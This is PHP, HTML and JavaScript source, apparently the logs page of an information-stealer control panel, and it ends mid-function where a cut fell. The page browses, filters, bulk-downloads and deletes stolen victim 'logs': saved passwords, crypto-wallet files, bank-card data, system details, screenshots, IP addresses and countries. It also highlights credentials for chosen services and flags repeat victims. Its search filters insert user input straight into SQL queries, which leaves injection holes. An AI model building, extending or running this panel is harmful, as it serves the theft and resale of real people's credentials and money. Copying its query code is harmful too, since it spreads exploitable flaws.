<?php

// -------------------------------------------------------------------------
// Include config
include_once 'Configs/Main.Config.php';
include_once 'App/Engine.php';

// -------------------------------------------------------------------------
// auth checker
if($_SESSION["login"] != true){
	header('Location: login.php', true, 301);
	exit();
}

// -------------------------------------------------------------------------
// rights checker
if($_SESSION["user"]["logs"] ? false : true){
	header('Location: dashboard.php', true, 301);
	exit();
}

// -------------------------------------------------------------------------
// gets
$action		= $_GET["action"];
$comment	= $_GET["comment"];
$UID		= $_GET["UID"];
$pageNum	= $_GET["page"];
$ids		= $_GET["ids"];

// search params
$settings_id			= str_replace('|', ' ', $_GET["settings_id"]);
$settings_ip			= str_replace('|', ' ', $_GET["settings_ip"]);
$settings_country		= str_replace('|', ' ', $_GET["settings_country"]);
$settings_note			= str_replace('|', ' ', $_GET["settings_note"]);
$settings_system		= str_replace('|', ' ', $_GET["settings_system"]);
$settings_passwords		= str_replace('|', ' ', $_GET["settings_passwords"]);
$settings_from			= $_GET["settings_from"];
$settings_to			= $_GET["settings_to"];
$settings_hide_empty	= $_GET["settings_hide_empty"];
$settings_only_qnique	= $_GET["settings_only_qnique"];
$settings_cards			= $_GET["settings_cards"];
$settings_crypto		= $_GET["settings_crypto"];


// -------------------------------------------------------------------------
// logs worker init
$logsWorker = new LogsWorker();

// -------------------------------------------------------------------------
// actions checker
if($action != null){
	switch($action){
		case "modal":
			viewLogs($db, $config, $logsWorker, $pageNum, $settings_id, 
				$settings_ip, $settings_country, $settings_note, $settings_system, $settings_passwords, 
				$settings_from, $settings_to, $settings_hide_empty, $settings_only_qnique, 
				$settings_cards, $settings_crypto);
			break;
			
		case "update_comment":
			updateComment($db, $UID, $comment);
			break;
			
		case "delete_log":
			deleteLog($db, $UID);
			break;
			
		case "delete_logs":
			deleteLogs($db, $ids);
			break;
			
		default:
			break;
	}
		
	exit(0);
}

// -------------------------------------------------------------------------
// Countries stats
$countries_stats_array;
$statitics_countries = $db->query("SELECT * FROM `statitics_countries`");

while ($statitics_countries_one = $statitics_countries->fetch_assoc()){ 
	$countries_stats_array[$statitics_countries_one["Code"]]["Count"] = $statitics_countries_one["Count"];
	$countries_stats_array[$statitics_countries_one["Code"]]["Name"] = $statitics_countries_one["Name"];
}

// -------------------------------------------------------------------------
// delete log func
function deleteLog($db, $log_to_delete){
	$log_to_delete = mysqli_real_escape_string($db, $log_to_delete);
	
	$log = $db->query("SELECT * FROM `logs` WHERE `UID`='$log_to_delete'")->fetch_array();
	
	if($log != null){
		$db->query("DELETE FROM `logs` WHERE `UID`='$log_to_delete'");
		
		unlink(realpath($config["logs_folder"].'/'. $log["user"] .''));
		
		echo "success";
	} 
	else { echo "error"; }
	
	exit(0);
}

// -------------------------------------------------------------------------
// delete log func
function deleteLogs($db, $ids){
	$ids = substr($ids, 0, -1);
	$logs_to_delete = explode(",", $ids);
	
	foreach ($logs_to_delete as $logID){
		$logID = mysqli_real_escape_string($db, $logID);
		
		$log = $db->query("SELECT * FROM `logs` WHERE `UID`='$logID'")->fetch_array();
		
		if($log != null){
			$db->query("DELETE FROM `logs` WHERE `UID`='$logID'");
			
			unlink(realpath($config["logs_folder"].'/'. $log["user"] .''));
		}
	}
	
	echo "success";
	exit(0);
}

// -------------------------------------------------------------------------
// update comment func
function updateComment($db, $UID, $comment)
{
	$UID = mysqli_real_escape_string($db, $UID);
	$comment = mysqli_real_escape_string($db, $comment);
	
	$db->query("UPDATE `logs` SET `Comment`='$comment' WHERE `UID`='$UID'");
	
	echo "success";
	
	exit(0);
}

// -------------------------------------------------------------------------
// logs table modal
function viewLogs($db, $config, $logsWorker, $page, $settings_id, 
	$settings_ip, $settings_country, $settings_note, $settings_system, $settings_passwords, 
	$settings_from, $settings_to, $settings_hide_empty, $settings_only_qnique, 
	$settings_cards, $settings_crypto){
	$logs;
	$request = "SELECT * FROM `logs` ";
	$request_where_count = 0;
	$request_from = false;
	
	// pagination
	if($page == null){
		$page = 1;
	}
	
	// search by settings_id
	if($settings_id != null){
		$request .= " WHERE `UID`='$settings_id' ";
		$request_where_count++;
	}
	
	// search by like ip
	if($settings_ip != null){
		if($request_where_count == 0){
			$request_where_count++;
			
			$request .= " WHERE `IP` LIKE '%$settings_ip%' ";
		}
		else $request .= " AND `IP` LIKE '%$settings_ip%' ";
	}
	
	// search by country
	if($settings_country){
		if($request_where_count == 0){
			$request_where_count++;
			
			$request .= " WHERE `Country`='$settings_country' ";
		} 
		else $request .= " AND `Country`='$settings_country' ";
	}
	
	// search by like note
	if($settings_note != null){
		if($request_where_count == 0){
			$request_where_count++;
			
			$request .= " WHERE `Comment` LIKE '%$settings_note%' ";
		}
		else $request .= " AND `Comment` LIKE '%$settings_note%' ";
	}
	
	// search by like time from
	$request_dates;
	
	if($settings_from != null){
		$request_from = true;
		$date_from = new Datetime($settings_from);
		$date_from = $date_from->format('Y-m-d H:i:s');
			
		if($request_where_count == 0){
			$request_where_count++;
			
			$request_dates .= " WHERE `DateAdded` BETWEEN '$date_from' ";
		} 
		else $request_dates .= " AND `DateAdded` BETWEEN '$date_from' ";
	}
	
	// search by like passwords
	if($settings_passwords != null)
	{
		if($request_where_count == 0){
			$request_where_count++;
			
			$request .= " WHERE `Passwords` LIKE '%$settings_passwords%' ";
		}
		else $request .= " AND `Passwords` LIKE '%$settings_passwords%' ";
	}
	
	// search by like system
	if($settings_system != null)
	{
		if($request_where_count == 0){
			$request_where_count++;
			
			$request .= " WHERE `System` LIKE '%$settings_system%' ";
		}
		else $request .= " AND `System` LIKE '%$settings_system%' ";
	}
	
	// search by like time to
	if($settings_to != null){
		$date_to = new Datetime($settings_to);
		$date_to = $date_to->modify('+23 hours 59 minutes 59 seconds');
		$date_to = $date_to->format('Y-m-d H:i:s');
		
		// request from indicated
		if($request_from){	
			$request .= $request_dates;
			$request .= "  AND '$date_to' ";
		} 
		else {
			$CurrentDate = date("Y-m-d H:i:s");
			
			if($request_where_count == 0){
				$request_where_count++;
				
				$request .= " WHERE `DateAdded` BETWEEN '1980-01-01 00:00:00' AND '$date_to' ";
			}
			else $request .= " AND `DateAdded` BETWEEN '1980-01-01 00:00:00' AND '$date_to' ";			
		}
	}
	else{
		if($request_from){
			$CurrentDate = date("Y-m-d H:i:s");
		
			$request .= $request_dates;
			$request .= "  AND '$CurrentDate' ";
		}
	}
	
	// search without empty logs
	if($settings_hide_empty == "1"){
		if($request_where_count == 0){
			$request_where_count++;
			
			$request .= " WHERE NOT `CountPass`='0' ";
		}
		else $request .= " AND NOT `CountPass`='0' ";
	}
	
	// search only unique logs
	if($settings_only_qnique == "1"){
		if($request_where_count == 0){
			$request_where_count++;
			
			$request .= " WHERE NOT `Duplicate`='1' ";
		}
		else $request .= " AND NOT `Duplicate`='1' ";
	}
	
	// search only cc logs
	if($settings_cards == "1"){
		if($request_where_count == 0){
			$request_where_count++;
			
			$request .= " WHERE NOT `CountCards`='0' ";
		}
		else $request .= " AND NOT `CountCards`='0' ";
	}
	
	// search only crypto logs
	if($settings_crypto == "1"){
		if($request_where_count == 0){
			$request_where_count++;
			
			$request .= " WHERE NOT `CountCrypto`='0' ";
		} else $request .= " AND NOT `CountCrypto`='0' ";
	}
	
	
	// pagination
	if($page == 1) $request .= " ORDER BY `UID` DESC LIMIT 100;";
	else{
		$prew = $page-1;
		
		$request .= " ORDER BY `UID` DESC LIMIT ". $prew ."00, ". $page ."00;";
	}

$logs = $db->query($request);

?>
<table class="table" >
	<thead style="background: #0168fa;">
		<tr>
			<th scope="col">ID</th>
			<th scope="col"></th>
			<th scope="col">Data</th>
			<th scope="col">Notes</th>
			<th scope="col">Information</th>
			<th scope="col">Network</th>
			<th scope="col">Date</th>
		</tr>
	</thead>
	<tbody>
		<? while ($log = $logs->fetch_assoc()){ ?>
		<tr>

			<!-- Number logs -->
			<th style="text-align: left;">
				<? echo $log["UID"]; 
				
					if($log["Duplicate"] == "1"){
						?> <i 	style="color: red;" 
								class="fas fa-angry text-red-darker custom-tooltips" 
								title="Log with this MachineID has already been" ></i>
						<?
					}
				?>
			</th>

			<!-- Checkbox log -->
			<td style="text-align: center;">
				<div class="custom-control custom-checkbox">
					<input type="checkbox" class="custom-control-input" id="select_log_<? echo $log["UID"]; ?>" name="select_log" file_name="<? echo $log["FileName"]; ?>" link_to_download="<? echo $config["main"]["LogsFolder"]."/".$log["FileName"]; ?>" value="<? echo $log["UID"]; ?>">
					<label class="custom-control-label" for="select_log_<? echo $log["UID"]; ?>"></label>
				</div>
			</td>
			
			<!-- Data -->
			<td style="text-align: left;white-space: inherit;">

				<span style="cursor: pointer; margin: 4px; border-radius: 3px; padding: .6em .6em .6em; background: #<? if($log["CountPass"] > 0) { echo "348fe2"; }else{ echo "2d353c"; } ?>; color: #fff; font-size: 75%; font-weight: 600;" onclick="viewPasswords('view.php?log=<? echo $log["FileName"]; ?>&file=passwords.txt&action=modal')">
					<i class ="fa fa-key" style="width: 10px; font-weight: 900;"></i> 
					<? echo $log["CountPass"]; ?>
				</span>
				<span style=" margin: 4px; border-radius: 3px; padding: .6em .6em .6em; background: #f2f3f4;; color: #2d353c; font-size: 75%; font-weight: 600;">
					<i style="width: 10px;" class="fab fa-bitcoin"></i> 
					<? echo $log["CountCrypto"]; ?>
				</span>
				<span style=" margin: 4px; border-radius: 3px; padding: .6em .6em .6em; background: #f2f3f4;; color: #2d353c; font-size: 75%; font-weight: 600;">
					<i style="width: 10px;" class="far fa-credit-card"></i> 
					<? echo $log["CountCards"]; ?>
				</span>
					
				<br>
				<div style="width: 310px;">
					<?
					$markers = $db->query("SELECT * FROM `markers`;");
					
					while ($marker = $markers->fetch_assoc())
					{
						$services = explode(",", $marker["URLs"]);
						
						foreach ($services as $service)
						{
							$passwords = nl2br($log["Passwords"]);
							$pos = stripos($passwords, $service);
							
							if ($pos !== false)
							{
								?>
								<div class="text-nowrap d-inline-block" style="margin-top: 6px;">
									<span style="color: #<? echo $marker["Color"]; ?>"><i class="fa fa-key"></i> <? echo $service; ?></span>
								</div>
								<?
							}
						}
					}
					
					?>
				</div><?
				
				$zip = new ZipArchive;
				$reading = "";
				
				if ($zip->open(realpath($config["main"]["LogsFolder"].'/'. $log["FileName"] .'')) === TRUE){
					$count = $zip->numFiles;
					
					for ($i = 0; $i < $count; $i++){
						$stat = $zip->statIndex($i);
						$found = strripos($stat['name'], "crypto/");
						
						if($found === false){}
						else{
							?>
							<br>
							<a class="btn btn-primary btn-xs m-2" href="view.php?log=<? echo $log["FileName"]; ?>&file=<? echo $stat["name"]; ?>&action=download" target="_blank" style="background: #348fe2; border-color: #348fe2; line-height: 18px; padding: 1px 5px;">
								<i class="fa fa-file"></i> <? echo substr($stat["name"], 7); ?> -  (<? echo formatSizeUnits($stat['size']); ?>)<br>
							</a>
							<?
						}
					}
				}
				?>
				<div style="width: 260px;"></div>
			</td>

			<!-- Notes -->
			<td>
				<div class="input-group m-t-2 m-b-2">
					<textarea maxlength="1600" id="new_comment_<? echo $log["UID"]; ?>" type="text" class="form-control p-3" style="height: auto;"><? echo $log["Comment"]; ?></textarea>					
				</div>
                <div class="input-group-addon p-0 mt-1">
				        <button type="button" onclick="UpdateComment(<? echo $log["UID"]; ?>);" class="btn btn-xs btn-primary">
						<i class="fas fa-save"></i>
					</button>
				</div>
			</td>

			<!-- Information -->
			<td class=" text-center">
				<span class="text-nowrap">
					<a class="btn btn-primary btn-xs" href="view.php?log=<? echo $log["FileName"]; ?>&action=download" target="_blank" >
						<i class="fas fa-link"></i> 
						Download
					</a>
						
					<a class="btn btn-outline-light btn-xs" style="cursor: pointer;" onclick="viewInfo('view.php?log=<? echo $log["FileName"]; ?>&file=system.txt');">
						<i class="fas fa-info-circle"></i>
					</a>
					
					<a class="btn btn-outline-light btn-xs" style="cursor: pointer;" onclick="viewScreenshot('view.php?log=<? echo $log["FileName"]; ?>&file=screenshot.jpg&action=modal')" data-toggle="modal">
						<i style="width: 12px; color: #707478" class="fas fa-image"></i>
					</a>
					
					<a class="btn btn-outline-light btn-xs" style="cursor: pointer;" onclick="deleteLog(<? echo $log["UID"]; ?>)" data-toggle="modal">
						<i style="width: 12px; color: #707478" class="fas fa-trash-alt"></i>
					</a>
					
					<br>
					
					<small>
						<span><i class="fa fa-file-archive"></i> <? echo formatSizeUnits(filesize(realpath($config["main"]["LogsFolder"].'/'. $log["FileName"] .''))); ?></span> 
					</small>
				</span>
			</td>

			<!-- Network -->
			<td class=" text-center">
				<img src="Template/img/flags/<? echo strtolower($log["Country"]); ?>.png" alt="" title="">
				<? echo $log["Country"]; ?><br><? echo $log["IP"]; ?>
			</td>

			<!-- Date -->
			<td class=" text-center">
				<strong><?
					$startTime = new Datetime($log["DateAdded"]);
					$endTime = new DateTime();
					
					$diff = date_diff($endTime, $startTime);
					
					if($diff->format('%d') > 0) echo $diff->format('%d')."d ";
					if($diff->format('%H') > 0) echo $diff->format('%H')."h ";
					if($diff->format('%i') > 0) echo $diff->format('%i')."m ";
					if($diff->format('%s') > 0) echo $diff->format('%s')."s";
					?> 
					ago
				</strong>
				<br>
				<? echo $log["DateAdded"]; ?>
			</td>
		</tr>
	<? } ?>
	</tbody>	
</table>

<div style="margin: 12px; align: right;">
	<nav>
		<ul class="pagination pagination-space mg-b-0">
			<?
			
			if($page == 1){
				?>
				<li class="page-item disabled">
					<a class="page-link page-link-icon" >
						<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-left"><polyline points="15 18 9 12 15 6"></polyline></svg>
					</a>
				</li>
				<li onclick="updateLogsList(<? echo $page; ?>);" class="page-item active" style="cursor: pointer;">
					<a class="page-link" ><? echo $page; ?></a>
				</li>
				<li onclick="updateLogsList(<? echo $page+1; ?>);" class="page-it em" style="cursor: pointer;">
					<a class="page-link" ><? echo $page+1; ?></a>
				</li>
				<li onclick="updateLogsList(<? echo $page+2; ?>);" class="page-item" style="cursor: pointer;">
					<a class="page-link" ><? echo $page+2; ?></a>
				</li>
				<li class="page-item" style="cursor: pointer;">
					<a onclick="updateLogsList(<? echo $page+2; ?>);" class="page-link page-link-icon">
						<i class="fas fa-chevron-right"></i>
					</a>
				</li>
				<?
			}
			else{
				?>
				<li onclick="updateLogsList(<? if($page == 2){ echo $page-1; }else{ echo $page-2; } ?>);"
					class="page-item" 
					style="cursor: pointer;">
					<a class="page-link page-link-icon" >
						<i class="fas fa-chevron-left"></i>
					</a>
				</li>
				<li onclick="updateLogsList(<? echo $page-1; ?>);" 
					class="page-item" 
					style="cursor: pointer;">
					<a class="page-link" ><? echo $page-1; ?></a>
				</li>
				<li onclick="updateLogsList(<? echo $page; ?>);" 
					class="page-item active" 
					style="cursor: pointer;">
					<a class="page-link" ><? echo $page; ?></a>
				</li>
				<li onclick="updateLogsList(<? echo $page+1; ?>);" 
					class="page-item" 
					style="cursor: pointer;">
					<a class="page-link" ><? echo $page+1; ?></a>
				</li>
				<li class="page-item" style="cursor: pointer;">
					<a onclick="updateLogsList(<? echo $page+2; ?>);" 
					class="page-link page-link-icon">
						<i class="fas fa-chevron-right"></i>
					</a>
				</li>
				<?
			}
			
			?>
		</ul>
	</nav>
</div>

<?

exit(0);

}

$pageID = "Logs";

include_once 'Models/Header.php';

?>

<!-- Sorter -->
<div class="content content-fixed">

	<!-- Main -->
	<div class="card ht-100p">
	
		<!-- Header -->
		<div class="card-header d-flex align-items-center justify-content-between" style="background: #2d353e;">
			<h6 class="mg-b-0" style="color: white;">Logs</h6>
		</div>
		

		<div class="row row-xs ">
			<div class="col mg-t-10">
				<div class="row m-b-10 mt-2" style="margin-left: 0; margin-right:0;">

					<!-- ID -->
					<div class="col-md-1">
						<input type="text" placeholder="ID" class="form-control" id="settings_id">
					</div>

					<!-- IP -->
					<div class="col-md-1">
						<input type="text" placeholder="IP" class="form-control" id="settings_ip">
					</div>

					<!-- All countries -->
					<div class="col-md-2">
						<select class="form-control select2" id="settings_country">
							<option label="All countries"></option>
							<option value="ALL">All countries</option>
							<?
							
							arsort($countries_stats_array);
							
							foreach ($countries_stats_array as $key => $val){
								
								if($countries_stats_array[$key]["Count"] == 0){ break; }
								
							?>
							<option value="<? echo $key; ?>">
								<? echo $key; ?>
								(<? echo $countries_stats_array[$key]["Count"]; ?>)
							</option>
							<? } ?>
						</select>
					
					</div>

					<!-- Note -->
					<div class="col-md-1">
						<input type="text" placeholder="Note" class="form-control" id="settings_note">
					</div>

					<!-- System -->
					<div class="col-md-2">
						<input type="text" placeholder="System" class="form-control" id="settings_system">
					</div>

					<!-- Password -->
					<div class="col-md-2">
						<input type="text" placeholder="Passwords" class="form-control" id="settings_passwords">
					</div>

					<!-- Date -->
					<div class="col-md-3">
						<div class="input-group m-b-1"
							style="border-radius: 5px; background: #d9e0e7; color: #555; text-align: center; ">
							<!-- Calendar icon -->
							<div style="border-radius: 4px; padding: 6px 6px; font-size: 18px; font-weight: 400; color: #707478;">
								<i class="far fa-calendar"></i>
							</div>
							<!-- Date start -->
							<input type="text" placeholder="Date from" class="form-control" id="datepicker">

							<!-- Trait -->
							<div style="border-radius: 4px; padding: 6px 12px; font-size: 14px; font-weight: 400; color: #707478;">
								‒
							</div>
							<!-- Date end -->
							<input type="text" placeholder="Date to" class="form-control" id="datepicker2">
						</div>
					</div>
					<div class="clearfix"></div>
				</div>
			</div>
		</div>
		<hr>

		<!-- Control panel -->
		<div class="row row-xs mb-1" style="margin-left:10px; margin-right:10px;">

			<!-- Select all -->
			<div class="d-flex align-items-center">
				<button type="button" onclick="SelectAll(this);" class="btn btn-xs btn-outline-primary">
					<i class="fas fa-check-square"></i> 
					Select all
				</button>
			</div>

			<!-- Unselect all -->
			<div class="d-flex align-items-center">
				<button type="button" onclick="UnselectAll(this);" class="btn btn-xs btn-outline-primary">
					<i class="fas fa-window-close"></i> 
					Unselect all
				</button>
			</div>

			<!-- Download -->
			<div class="d-flex align-items-center">
				<button type="button" onclick="DownloadSelected();" class="btn btn-xs btn-outline-primary">
					<i class="fas fa-file-download"></i> 
					Download
				</button>
			</div>

			<!-- Delete -->
			<div class="d-flex align-items-center">
				<button type="button" onclick="DeleteLogs();" class="btn btn-xs btn-outline-primary">
					<i class="fas fa-trash-alt"></i> 
					Delete
				</button>
			</div>

			<!-- Checkbox -->
		
				<!-- Hide empty -->
				<div class="col d-flex align-items-center justify-content-center">
					<div class="custom-control custom-checkbox">
						<input type="checkbox" class="custom-control-input" id="settings_hide_empty">
						<label class="custom-control-label" for="settings_hide_empty">
							Hide empty
						</label>
					</div>
				</div>
				
				<!-- Only unique -->
				<div class="col d-flex align-items-center justify-content-center">
					<div class="custom-control custom-checkbox">
						<input type="checkbox" class="custom-control-input" id="settings_only_qnique">
						<label class="custom-control-label" for="settings_only_qnique">Only unique</label>
					</div>
				</div>

				<!-- Bank cards -->
				<div class="col d-flex align-items-center justify-content-center">				
					<div class="custom-control custom-checkbox">
						<input type="checkbox" class="custom-control-input" id="settings_cards">
						<label class="custom-control-label" for="settings_cards">
							Bank cards
						</label>
					</div>
				</div>

				<!-- With crypto -->
				<div class="col d-flex align-items-center justify-content-center">
					<div class="custom-control custom-checkbox">
						<input type="checkbox" class="custom-control-input" id="settings_crypto">
						<label class="custom-control-label" for="settings_crypto">
							With Crypto
						</label>
					</div>						
				</div>
			
			<!-- /Checkbox -->

			<div class="col d-flex justify-content-end align-items-center">
				<!-- Refresh view los -->
				<button type="button" class="btn btn-light btn-icon" onclick="reloadLogsList();" style="margin-right: 8px;">
					<i class="fa fa-sync-alt"></i>
				</button>
				<!-- Search logs  -->
				<button type="button" class="btn btn-primary" onclick="searchLogs();">
					<i class="fas fa-search"></i> 
					Search
				</button>
			</div>
		</div>
		<!-- /Control panel -->
	
		<!-- View logs table -->
        <div class="row row-xs">
			<div class="col mg-t-10">
				<div class="card card-dashboard-table">
					<div class="table-responsive">
						<div class="viewLogs"></div>
					</div>
				</div>
			</div>
		</div>

	</div>
	<!-- /Main -->

</div>
<!-- /Sorter -->


<!-- Information at log -->
<div class="modal fade" id="modalInfo" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel6" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered" role="document">
		<div class="modal-content tx-14">

			<!-- header -->
			<div class="modal-header">
				<h6 class="modal-title" id="exampleModalLabel6">
					Information at log
				</h6>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>

			<!-- body -->
			<div class="modal-body1" style="padding: 12px;"></div>
			
			<!-- footer -->
			<div class="modal-footer">
				<button type="button" class="btn btn-secondary tx-13" data-dismiss="modal">
					Close
				</button>
			</div>
		</div>
	</div>
</div>

<!-- Password -->
<div class="modal fade" id="modalPasswords" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel6" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered" role="document" style="max-width: 90%;">
		<div class="modal-content tx-14">

			<!-- header -->
			<div class="modal-header">
				<h6 class="modal-title" id="exampleModalLabel6">
					Passwords from log
				</h6>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>

			<!-- body -->
			<div class="modal-body2"></div>

			<!-- footer -->
			<div class="modal-footer">
				<button type="button" class="btn btn-secondary tx-13" data-dismiss="modal">
					Close
				</button>
			</div>
		</div>
	</div>
</div>

<!-- Screenshot -->
<div class="modal fade" id="modalScreenshot" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel6" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered" role="document" style="max-width: 90%;">
		<div class="modal-content tx-14">

			<!-- header -->
			<div class="modal-header">
				<h6 class="modal-title" id="exampleModalLabel6">
					Screenshot
				</h6>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>

			<!-- body -->
			<div class="modal-body3"></div>

			<!-- footer -->
			<div class="modal-footer">
				<button type="button" class="btn btn-secondary tx-13" data-dismiss="modal">
					Close
				</button>
			</div>
		</div>
	</div>
</div>

<!-- Downloader -->
<div class="modal fade" id="modalDownloader" tabindex="-1" role="dialog" aria-labelledby="downloader_label_modal" aria-hidden="true">
      <div class="modal-dialog" role="document" style="max-width: 700px;">
        <div class="modal-content tx-14">
          <div class="modal-header">
            <h6 class="modal-title" id="downloader_label_modal">Download selected logs</h6>
            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
              <span aria-hidden="true">&times;</span>
            </button>
          </div>
          <div class="modal-body">
            <p class="mg-b-0" id="downloader_label" ></p>
			<br>
          </div>
          <div class="modal-footer">
            <button type="button" class="btn btn-secondary tx-13" data-dismiss="modal">Close</button>
          </div>
        </div>
      </div>
    </div>

<script>
	$( 
		function(){
			$( "#datepicker" ).datepicker();
			$( "#datepicker2" ).datepicker();
		} 
	);

	$('.viewLogs').load("browse.php?action=modal");

</script>

<script>
	var settings_id, 
		settings_ip, 
		settings_country,
		settings_note,
		settings_system,
		settings_passwords,
		settings_from,
		settings_to,
		settings_hide_empty,
		settings_only_qnique,
		settings_cards,
		settings_crypto;

// ---------------------------------------------------------------------------------------
// deleteLog
//
// del one log
// ---------------------------------------------------------------------------------------
function deleteLog(id){
	var xhr = new XMLHttpRequest();

	xhr.open('GET', 'browse.php?action=delete_log&UID='+ id);
	xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

	xhr.onload = function() {
		if (xhr.status === 200 && xhr.responseText == "success"){
			new Noty({
				timeout: 3500,
				text: 'Successful delete log',
				type: 'success',
				layout: 'topRight',
				theme: 'bootstrap-v4',
				progressBar: true
				
			}).show();
		}
		else {
			new Noty({
				timeout: 3500,
				text: 'Error: invalid response',
				type: 'error',
				layout: 'topRight',
				theme: 'bootstrap-v4',
				progressBar: true
				
			}).show();
		}
	};
	xhr.send(encodeURI('name'));
	
	searchLogs();
}

// ---------------------------------------------------------------------------------------
// deleteLogs
//
// mass del logs
// ---------------------------------------------------------------------------------------
function DeleteLogs(){
	var logs = "";
	var checkboxes = document.getElementsByName('select_log');
	var checkboxesChecked = [];
	
	for (var ind = 0; ind < checkboxes.length; ind++){
		if (checkboxes[ind].checked){
			checkboxesChecked.push(checkboxes[ind].value);
			logs = logs + "" + checkboxes[ind].value + ",";
		}
	}
	
	var xhr = new XMLHttpRequest();
	
	xhr.open('GET', 'browse.php?action=delete_logs&ids='+ logs);
	xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	
	xhr.onload = function() {
		if (xhr.status === 200 && xhr.responseText == "success"){
			new Noty({
				timeout: 3500,
				text: 'Successful delete selected logs',
				type: 'success',
				layout: 'topRight',
				theme: 'bootstrap-v4',
				progressBar: true
				
			}).show();
		}
		else {
			new Noty({
				timeout: 3500,
				text: 'Error: invalid response',
				type: 'error',
				layout: 'topRight',
				theme: 'bootstrap-v4',
				progressBar: true
				
			}).show();
		}
	};
	
	xhr.send(encodeURI('name'));
	searchLogs();
}

// ---------------------------------------------------------------------------------------
// SelectAll
//
// Select all logs
// ---------------------------------------------------------------------------------------
function SelectAll(source)
{
	var checkboxes = document.getElementsByName('select_log');
	
	for (var index = 0; index < checkboxes.length; index++){
		checkboxes[index].checked = true;
	}
}

// ---------------------------------------------------------------------------------------
// UnselectAll
//
// Unselect all logs
// ---------------------------------------------------------------------------------------
function UnselectAll(source)
{
	var checkboxes = document.getElementsByName('select_log');
	
	for (var index = 0; index < checkboxes.length; index++){
		checkboxes[index].checked = false;
	}
}

// ---------------------------------------------------------------------------------------
// getfilename
//
// 
// ---------------------------------------------------------------------------------------
function getfilename(path)
{
    path = path.substring(path.lastIndexOf("/")+ 1);
    return (path.match(/[^.]+(\.[^?#]+)?/) || [])[0];
}

// ---------------------------------------------------------------------------------------
// urlToPromise
//
// 
// ---------------------------------------------------------------------------------------
function urlToPromise(url) 
{
    return new Promise(function(resolve, reject) 
	{
        JSZipUtils.getBinaryContent(url, function (err, data) 
		{
            if(err) 
			{
                reject(err);
            } else 
			{
                resolve(data);
            }
        });
    });
}

// ---------------------------------------------------------------------------------------
// DownloadSelected
//
// Download selected logs
// ---------------------------------------------------------------------------------------
function DownloadSelected()
{
	$('#modalDownloader').modal({show:true});
	
	var progressbar = document.getElementById("downloader_progressbar");
	
	var checkboxes = document.getElementsByName('select_log');
	var zip = new JSZip();
	var count = 0;
	
	for (var index = 0; index < checkboxes.length; index++)
	{
		if (checkboxes[index].checked)
		{
			count++;
		}
	}
	
	for (var index = 0; index < checkboxes.length; index++)
	{
		if (checkboxes[index].checked)
		{
			var link = checkboxes[index].getAttribute("link_to_download");
			var name = getfilename(checkboxes[index].getAttribute("file_name"));
			
			document.getElementById("downloader_label").innerHTML="Pack " + name + "...";
			document.getElementById("downloader_label_modal").innerHTML="Pack " + (index+1) + " at " + count;
			zip.file(name, urlToPromise(link), {binary:true});
		}
	}
	
	document.getElementById("downloader_label").innerHTML="Generate...";
	
	zip.generateAsync({type:"blob"}).then(function(content)
	{
		var today = new Date();
		var date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
		var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
		var dateTime = date+'_'+time;
		
		saveAs(content, "Logs_"+dateTime+".zip");
	});
	
	document.getElementById("downloader_label").innerHTML="Waiting browser answer...";
}

// ---------------------------------------------------------------------------------------
// updateParams
//
// Update local params on page
// ---------------------------------------------------------------------------------------
function updateParams(){
	settings_cards 			= document.getElementById("settings_cards");
	if (settings_cards.checked == true) settings_cards = "1";
	else settings_cards = ""; 

	settings_country		= $('#settings_country').val();
	if(settings_country == "ALL") settings_country = "";

	settings_crypto			= document.getElementById("settings_crypto");
	if (settings_crypto.checked == true) settings_crypto = "1";
	else settings_crypto = ""; 

	settings_from			= document.getElementById("datepicker").value.replace(/ /g, '|');
	settings_hide_empty 	= document.getElementById("settings_hide_empty");
	if (settings_hide_empty.checked == true) settings_hide_empty = "1";
	else settings_hide_empty = "";

	settings_id				= document.getElementById("settings_id").value.replace(/ /g, '|');
	settings_ip				= document.getElementById("settings_ip").value.replace(/ /g, '|');
	settings_note			= document.getElementById("settings_note").value.replace(/ /g, '|');
	settings_only_qnique	= document.getElementById("settings_only_qnique");
	if (settings_only_qnique.checked == true) settings_only_qnique = "1";
	else settings_only_qnique = "";

	settings_passwords		= document.getElementById("settings_passwords").value.replace(/ /g, '|');
	settings_system			= document.getElementById("settings_system").value.replace(/ /g, '|');
	settings_to				= document.getElementById("datepicker2").value.replace(/ /g, '|');
	
}

// ---------------------------------------------------------------------------------------
// reloadLogsList
//
// reload logs list and clear settings params
// ---------------------------------------------------------------------------------------
function reloadLogsList(){
	document.getElementById("settings_cards").checked = false;
	document.getElementById("settings_country").value= "ALL";
	document.getElementById("settings_crypto").checked = false;
	document.getElementById("datepicker").value= null;
	document.getElementById("settings_hide_empty").checked = false;
	document.getElementById("settings_id").value= null;
	document.getElementById("settings_ip").value= null;
	document.getElementById("settings_note").value= null;
	document.getElementById("settings_only_qnique").checked = false;
	document.getElementById("settings_passwords").value= null;
	document.getElementById("settings_system").value= null;
	document.getElementById("datepicker2").value= null;
	
	page = null;
	
	updateLogsList();
}


// ---------------------------------------------------------------------------------------
// searchLogs
//
// Generate search request and view results on page
// ---------------------------------------------------------------------------------------
function searchLogs()
{
	updateParams();

	updateLogsList();
};

// ---------------------------------------------------------------------------------------
// updateLogsList
//
// Update logs list on page
// ---------------------------------------------------------------------------------------
function updateLogsList(page){
	updateParams();
	
	if(page != null)
